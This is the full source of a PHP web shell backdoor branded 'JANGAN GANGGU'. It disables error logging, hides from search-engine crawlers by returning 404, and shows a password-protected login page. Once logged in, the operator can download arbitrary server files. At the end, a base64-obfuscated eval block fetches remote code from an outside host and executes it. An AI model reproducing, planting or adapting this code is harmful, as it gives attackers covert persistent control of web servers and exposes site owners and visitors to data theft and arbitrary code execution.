<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password 			= "9e1e5953f8a4ed84af802d19956096bf";
$color 				= "#00ff00";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}

function login_shell() {
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
		<meta name='author' content='CodeXploit|JANGAN-OM'/>
		<meta name='author' content='Holiq@Indosec'/>
		<meta name='copyright' content='JANGAN GANGGU'/>
		<meta name='description' content='Imutz Shell Backdoor'>
		<meta name="theme-color" content="#000">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">

    <title>JANGAN GANGGU Shell Backdoor</title>
    <style>
    	body{
    		background-color:black;
    		}
    	img{
    		width: 450px;
    		height: 450px;
    	}
    	input[type="password"]{
    		background-color: transparent;
    	}
    	h2{
    		font-family:"Rock Salt";
    	}
    </style>
  </head>
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">JANGAN GANGGU</h2><hr>
    	<img src="https://amprjb.site/images/fav/10/hd_restoration_result_image%20(44).png" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    			<input type="password" name="pass" class="form-control">
    		</div>
    		<div class="col">
    			<input type="submit" class="btn btn-outline-light btn-block" value="Login">
    		</div>
    	</div></form>
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="#">JANGAN GANGGU</a></small>
    	</center>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  </body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
?>
<?php eval("?>".base64_decode("PD9waHAgDQokdXJsID0gImh0dHBzOi8vd3AtYmFja3VwLmxvbC9qYW5nYW5vbS9kb3IvbmdhcmVwLnR4dCI7DQokY2ggPSBjdXJsX2luaXQoJHVybCk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsNCmV2YWwoIj8+Ii4kcmVzdWx0KTsNCg0KPz4=")); ?>
